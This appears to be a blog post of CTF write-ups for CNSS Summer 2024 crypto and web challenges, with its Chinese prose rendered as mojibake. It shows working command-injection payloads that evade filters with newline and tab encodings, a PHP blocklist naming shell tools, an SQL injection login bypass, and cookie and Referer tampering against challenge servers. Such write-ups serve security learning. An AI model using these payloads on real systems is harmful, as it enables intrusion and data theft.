<p>å—¨ï¼Œåˆæ˜¯é“œã€‚$m_1&#x3D;m+k_1\delta,\ m_2&#x3D;m+k_2\delta$ï¼Œ$r&#x3D;(k_1-k_2)\delta$ã€‚<a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/2023/%F0%9F%98%8B%E5%8F%92%E6%98%AF%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97.py">flag</a></p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{Half-GCD 1s so u5eful!}</div> </article>



<h2 id="âš½Permutation"><a href="#âš½Permutation" class="headerlink" title="âš½Permutation"></a>âš½Permutation</h2><p>ç½®æ¢ç¾¤ä¸­æ€ä¹ˆæ±‚äºŒæ¬¡å‰©ä½™ï¼Ÿ</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">P = Permutations(<span class="number">256</span>).random_element()</span><br><span class="line"><span class="built_in">print</span>(P**<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>([x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(hashlib.sha512(<span class="built_in">str</span>(P).encode()).digest(), flag)])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[37, 12, 147, 180, 109, 42, 193, 61, 114, 167, 89, 229, 47, 30, 139, 226, 238, 200, 152, 210, 201, 103, 236, 130, 53, 16, 132, 39, 64, 29, 99, 36, 8, 4, 124, 58, 145, 54, 211, 223, 242, 146, 234, 43, 143, 235, 173, 231, 62, 115, 121, 9, 131, 102, 255, 49, 217, 24, 17, 212, 21, 117, 163, 172, 28, 68, 233, 25, 166, 67, 137, 136, 122, 207, 196, 222, 106, 128, 108, 156, 74, 220, 33, 83, 120, 45, 76, 170, 104, 133, 78, 254, 57, 191, 183, 181, 253, 123, 112, 134, 96, 44, 240, 195, 6, 82, 216, 7, 192, 111, 189, 190, 71, 98, 70, 218, 127, 251, 155, 256, 159, 19, 151, 252, 113, 116, 59, 160, 239, 92, 148, 202, 169, 248, 129, 203, 187, 27, 23, 153, 13, 162, 144, 51, 38, 10, 41, 107, 81, 186, 177, 164, 204, 20, 161, 157, 52, 224, 119, 14, 228, 72, 250, 69, 140, 101, 214, 205, 174, 77, 118, 232, 86, 176, 219, 91, 215, 60, 158, 197, 194, 221, 2, 94, 87, 88, 245, 80, 154, 5, 165, 40, 79, 150, 26, 126, 15, 3, 105, 175, 48, 50, 55, 206, 237, 90, 149, 184, 243, 31, 65, 11, 182, 84, 18, 199, 141, 85, 225, 142, 66, 185, 178, 179, 125, 93, 247, 75, 208, 171, 97, 246, 227, 46, 1, 34, 209, 110, 56, 22, 32, 135, 168, 244, 230, 95, 138, 73, 249, 100, 35, 63, 213, 241, 198, 188]</span></span><br><span class="line"><span class="string">[218, 197, 209, 36, 168, 67, 208, 21, 66, 22, 197, 141, 81, 24, 174, 245, 184, 56, 60, 64, 228, 224, 33, 91, 234, 61, 68, 241, 222, 169, 216, 172, 219, 43, 39, 37, 249, 11]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä¸ä¼šã€‚</p>
<h1 id="ğŸ•¸ï¸Web"><a href="#ğŸ•¸ï¸Web" class="headerlink" title="ğŸ•¸ï¸Web"></a>ğŸ•¸ï¸Web</h1><p>åšå¯†ç é¢˜çš„æ—¶å€™é‡åˆ°å¾ˆå¤šå’Œwebäº¤äº’çš„æƒ…å†µï¼Œé‚å‰æ¥å­¦ä¹ ï¼ˆç©ï¼‰ã€‚ä¸ä¼šWebï¼Œæ‰“ç€ç©çš„ã€‚</p>
<h2 id="ğŸ¦´babyHTTP"><a href="#ğŸ¦´babyHTTP" class="headerlink" title="ğŸ¦´babyHTTP"></a><strong>ğŸ¦´babyHTTP</strong></h2><p>psych ä¸Šè¯¾å¼€å°å·®ï¼Œä¸‹è¯¾ä¹‹ååŒæ¡Œè¯´ä»Šå¤©å­¦çš„ HTTP è¯·æ±‚ï¼Œç„¶è€Œ psych å¹¶ä¸çŸ¥é“è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œè¯·ä½ å¸®ä»–å®Œæˆä½œä¸šï¼Œè·å¾— flag ã€‚</p>
<blockquote>
<p>HTTP è¯·æ±‚æœ‰ä»€ä¹ˆå†…å®¹å‘¢ï¼Ÿ</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sunmc1204953974/article/details/49963311">ä¸€å¼ å›¾è¯´æ˜è®¿é—®ç½‘ç«™çš„æµç¨‹</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112010468">ç¡¬æ ¸ï¼30 å¼ å›¾è§£ HTTP å¸¸è§çš„é¢è¯•é¢˜</a></p>
<p>cURLæ˜¯ä¸€ç§é€šè¿‡å‘½ä»¤è¡Œæˆ–è„šæœ¬è¿›è¡Œæ•°æ®ä¼ è¾“çš„å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼Œå¯ä»¥ç”¨æ¥å‘é€httpè¯·æ±‚ï¼Œè·å–æœåŠ¡å™¨å“åº”ã€‚ï¼ˆè¿˜æœ‰å…¶ä»–åŠŸèƒ½ï¼‰</p>
<p><code>-i(--include)</code>é€‰é¡¹åœ¨è¾“å‡ºä¸­åŒ…å«æœåŠ¡å™¨è¿”å›çš„HTTPå“åº”å¤´ä¿¡æ¯ã€‚<code>-v(--verbose)</code>é€‰é¡¹æ˜¾ç¤ºè¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10101/&quot;</span></span><br><span class="line">Please GET me a CNSS with a value of <span class="string">&#x27;hackers&#x27;</span>.</span><br><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10101/?CNSS=hackers&quot;</span></span><br><span class="line">And I need you POST a web with a value of <span class="string">&#x27;fun&#x27;</span>.</span><br><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10101/?CNSS=hackers&quot;</span> -X POST -d <span class="string">&quot;web=fun&quot;</span> </span><br><span class="line">Do you know cookie?You are not admin!</span><br></pre></td></tr></table></figure>

<p>å…³äºcookieæˆ‘ä»¬-içœ‹ä¸€ä¸‹ï¼Œæ‰¾åˆ°<code>Set-Cookie: admin=false</code>ï¼Œæ”¹æˆtrueå°±è¡Œäº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10101/?CNSS=hackers&quot;</span> -X POST -d <span class="string">&quot;web=fun&quot;</span> -b <span class="string">&quot;admin=true&quot;</span></span><br><span class="line">CNSS&#123;w2b_!s_Reai1y_7un!!!&#125;</span><br></pre></td></tr></table></figure>

<p>å¾¡æ—çš„é¢˜è¿˜è€ƒäº†Refererï¼Œæç¤ºæˆ‘ä»¬You must come from â€œYulinSec:&#x2F;&#x2F;127.0.0.1â€</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl curl <span class="string">&quot;http://101.35.209.40:44505/?key1=YulinSec&quot;</span> -X POST -d <span class="string">&quot;key2=YulinSec&quot;</span> -H <span class="string">&quot;Referer:YulinSec://127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure>

<p>å…³äº302è·³è½¬é‡å®šå‘çš„é¢˜ï¼Œçœ‹æºç æç¤ºæˆ‘ä»¬flagä½äº<code>/302.php</code>ä¸‹ï¼Œç›´æ¥curlå³å¯æŸ¥åˆ°flagã€‚HTTP OPTIONS Method</p>
<h2 id="ğŸ™‹ğŸ¼â€â™€ï¸PHPinfo"><a href="#ğŸ™‹ğŸ¼â€â™€ï¸PHPinfo" class="headerlink" title="ğŸ™‹ğŸ¼â€â™€ï¸PHPinfo"></a><strong>ğŸ™‹ğŸ¼â€â™€ï¸PHPinfo</strong></h2><p>CNSSå¨˜ï¼phpinfoæ–‡ä»¶æ˜¯ä»€ä¹ˆå‘€ï¼</p>
<p><a target="_blank" rel="noopener" href="https://www.wpdaxue.com/how-to-create-phpinfo-file-and-view-php-information.html">å¦‚ä½•åˆ›å»ºphpinfoæ–‡ä»¶å¹¶æŸ¥çœ‹PHPä¿¡æ¯ â€“ WordPresså¤§å­¦ (wpdaxue.com)</a></p>
<p>ç›´æ¥åœ¨URLåæ·»åŠ <code>/phpinfo.php</code>æŸ¥æ‰¾å³å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnss&#123;l3t_u5_l3arn_php!nfo!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ğŸ¥‡æˆ‘å¾—å†å¿«ç‚¹"><a href="#ğŸ¥‡æˆ‘å¾—å†å¿«ç‚¹" class="headerlink" title="ğŸ¥‡æˆ‘å¾—å†å¿«ç‚¹"></a><strong>ğŸ¥‡æˆ‘å¾—å†å¿«ç‚¹</strong></h2><p>è€ƒéªŒæ‰‹é€Ÿçš„æ—¶å€™åˆ°äº†</p>
<blockquote>
<p>scRsCrIptiPt</p>
</blockquote>
<p><img src="/../images/CNSS-Summer-2024/1.png" alt="æˆ‘å¾—å†å¿«ç‚¹"></p>
<p>çœ‹äº†ç½‘é¡µçš„æºä»£ç ï¼Œä½¿ç”¨javascriptå®ç°ä¸€ä¸ªè‡ªåŠ¨åˆ·æ–°çš„é¡µé¢ï¼ŒGETä¼ å‚åˆ°<code>/check</code>å°±è¡Œäº†ã€‚</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Key : 6Dd3LzGVhvEn8wv<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;variable&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/check&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;value&quot;</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;Flag&quot;</span>&gt;</span>Flag<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœºå™¨çš„ç¡®æ˜¯æ¯”äººå¿«å‘€ï¼å†™ä¸€ä¸ªpythonè„šæœ¬ï¼ŒRequestsåº“ä¸ç½‘ç«™è¿›è¡Œäº¤äº’ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://152.136.11.155:10103&#x27;</span></span><br><span class="line">submit_url = <span class="string">&#x27;http://152.136.11.155:10103/check&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5_hash</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = requests.get(url).text</span><br><span class="line">        key = content.split(<span class="string">&#x27;Key : &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;span id=&quot;variable&quot;&gt;&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(key.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> requests.get(submit_url, params=&#123;<span class="string">&#x27;value&#x27;</span>: md5_hash&#125;).text</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    md5_hash = get_md5_hash()</span><br><span class="line">    <span class="keyword">if</span> md5_hash:</span><br><span class="line">        result = submit_md5(md5_hash)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">cnss&#123;3njoy_py5crIpt_n0w!!&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="ğŸ“Ping"><a href="#ğŸ“Ping" class="headerlink" title="ğŸ“Ping"></a><strong>ğŸ“Ping</strong></h2><p>psychï¼š#ping<br>CNSSå¨˜ï¼špong!</p>
<p>è¿ä¸Šä¹‹ååªæœ‰ä¸€æ®µPHPä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$ping_result</span> = <span class="title function_ invoke__">ping</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="variable">$ping_result</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾è¿™æ˜¯è®©æˆ‘ä»¬ç”¨POSTæ–¹æ³•ä¼ ä¸€ä¸‹ipåœ°å€ï¼Œç„¶åæœåŠ¡å™¨æ‰§è¡Œpingå‡½æ•°ã€‚è¯•ä¸€ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10104/&quot;</span> -X POST -d <span class="string">&quot;ip=127.0.0.1&quot;</span></span><br><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.&lt;br /&gt;</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms&lt;br /&gt;</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">--- 127.0.0.1 ping statistics ---&lt;br /&gt;</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 31ms&lt;br /&gt;</span><br><span class="line">rtt min/avg/max/mdev = 0.039/0.042/0.046/0.007 ms</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰å›æ˜¾ï¼Œä½†è¿‡äºæ­£å¸¸ã€‚é€šè¿‡æœç´¢ctf web pingå¾—çŸ¥ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¿æ¥ç¬¦å°è¯•åˆ—ç›®å½•ã€‚äºæ˜¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10104/&quot;</span> -X POST -d <span class="string">&quot;ip=127.0.0.1;ls&quot;</span></span><br><span class="line">Error: Invalid input.</span><br><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10104/&quot;</span> -X POST -d <span class="string">&quot;ip=127.0.0.1;&quot;</span></span><br><span class="line">Error: Invalid input.</span><br></pre></td></tr></table></figure>

<p>ä¸å¹¸åˆå¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“åˆ†å·<code>;</code>è¢«æ»¤æ‰äº†ã€‚å¼€æœï¼</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10104/&quot;</span> -X POST -d <span class="string">&quot;ip=127.0.0.1%0als&quot;</span></span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>

<p>å‡ºç°äº†ï¼Œemmmï¼Œä¸æ˜¯æƒ³è¦çš„ã€‚åˆ«æ€¥ï¼Œçœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿ï¼šå“ï¼Œç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://152.136.11.155:10104/&quot;</span> -X POST -d <span class="string">&quot;ip=127.0.0.1%0acat%09index.php&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_input</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$invalid_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;chown&quot;</span>,<span class="string">&quot; &quot;</span>, <span class="string">&quot;chmod&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$invalid_chars</span> <span class="keyword">as</span> <span class="variable">$invalid_char</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="variable">$invalid_char</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip_address</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">validate_input</span>(<span class="variable">$ip_address</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Error: Invalid input.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;ping -c 2 &quot;</span> .<span class="variable">$ip_address</span>;</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$output</span>, <span class="variable">$return_code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$return_code</span> !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;Error: Failed to execute command.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$ping_result</span> = <span class="title function_ invoke__">ping</span>(<span class="variable">$ip</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="variable">$ping_result</span>); <span class="comment">// è¾“å‡ºpingç»“æœå¹¶ä¿ç•™æ¢è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ€»ç®—çœ‹åˆ°è¿‡æ»¤å±‚äº†ã€‚å»å…¶TAç›®å½•çœ‹çœ‹å§ã€‚</p>
<p><img src="/../images/CNSS-Summer-2024/2.png" alt="HackBar"></p>
<p>å“ˆï¼Ÿå“ˆï¼Here it isï¼æ¥æ¥è®©æˆ‘ä»¬catä¸€ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://152.136.11.155:10104/&quot;</span> -X POST -d <span class="string">&quot;ip=1.1.1.1%0acat%09../../../f*&quot;</span></span><br><span class="line">CNSS&#123;p0ng_pong_p0ng!!!&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¹‹å‰æˆ‘ä¸€ç›´å°è¯•ç½‘ä¸Šæœåˆ°çš„å„ç§ç»•è¿‡flagé™åˆ¶çš„æ–¹æ³•ï¼Œç›´åˆ° fanâœŒï¸ä¸€å¥è¯ç‚¹é†’äº†æˆ‘</p>
<p><img src="/../images/CNSS-Summer-2024/3.png" alt="fanllspd"></p>
<p>å­¦åˆ°äº†ï¼Œè°¢è°¢å®å®ï¼ˆå•¾å’ªï¼‰&gt;</p>
<h2 id="ğŸ¶CNSSå¨˜ã®å® ç‰©å•†åº—"><a href="#ğŸ¶CNSSå¨˜ã®å® ç‰©å•†åº—" class="headerlink" title="ğŸ¶CNSSå¨˜ã®å® ç‰©å•†åº—"></a><strong>ğŸ¶CNSSå¨˜ã®å® ç‰©å•†åº—</strong></h2><p>CNSSå¨˜å¼€å§‹åˆ›ä¸šå•¦ï¼CNSSå¨˜ã®å® ç‰©å•†åº—æ­£å¼å¼€ä¸šï¼</p>
<blockquote>
<p>CNSSå¨˜çš„è´¦å·æ˜¯ <code>admin</code> , ç™»é™†æŸ¥çœ‹CNSSå¨˜è—åœ¨åå°çš„ç§˜å¯†â€¦â€¦</p>
</blockquote>
<p>sqlæ³¨å…¥<code>&#39; or 1=&#39;1</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CNSS&#123;h0w_d0_y0u_637_7h3_p455w0rd1?&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ğŸ®2048"><a href="#ğŸ®2048" class="headerlink" title="ğŸ®2048"></a><strong>ğŸ®2048</strong></h2><p>2048çœŸå¥½ç©ï¼Œç©åˆ°1000000åˆ†å°±èƒ½æ‹¿åˆ°flagï¼</p>
<blockquote>
<p>ä¸æ˜¯ï¼Œä½ çœŸç©å•Šï¼Ÿ</p>
</blockquote>
<p>ç¦äº†F12å’Œå³é”®ï¼ŒCtrl+Shift+Iæ‰“å¼€æ§åˆ¶å°ï¼ŒæŸ¥çœ‹FlagæŒ‰é’®çš„HTMLæ ‡ç­¾ï¼Œæ³¨æ„åˆ°</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getflag()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Flag&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨Sourcesçš„main2048.jsä¸­æŸ¥åˆ°getflag()å‡½æ•°ï¼ˆä»¥åŠä¸‹é¢å„ç§å±è”½ï¼‰ï¼Œå‘ç°æ˜¯ä¸€å †ä¹±ç ã€‚æƒ³æ³•æ˜¯æ‰¾åˆ°åˆ¤æ–­ç‚¹1000000åˆ†ä½†æ˜¯æ²¡æŸ¥åˆ°ï¼Œå¤åˆ¶ä¸‹æ¥è½¬å»æŸ¥scoreï¼Œå‘ç°</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;=<span class="number">0xf4240</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª0xf4240åˆšå¥½æ˜¯1000000ï¼Œç»™å®ƒæ”¹æˆ0å†æŒ‰ä¸€ä¸‹FlagæŒ‰é’®å³å¯æ‹¿åˆ°flagã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnss&#123;3asy_fr0nt_kn0w1edge!!!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ğŸ‘¤æ¢ä¸ªå¤´åƒå…ˆ"><a href="#ğŸ‘¤æ¢ä¸ªå¤´åƒå…ˆ" class="headerlink" title="ğŸ‘¤æ¢ä¸ªå¤´åƒå…ˆ"></a><strong>ğŸ‘¤æ¢ä¸ªå¤´åƒå…ˆ</strong></h2><p>CNSSå¨˜è¿™ä¹ˆå¯çˆ±ï¼Œä½ ç¡®å®šè¦æŠŠå¥¹æ¢æ‰å—ï¼Ÿ</p>
<blockquote>
<p>çœŸçš„åªèƒ½ä¸Šä¼ å›¾ç‰‡å—ï¼Ÿ</p>
</blockquote>
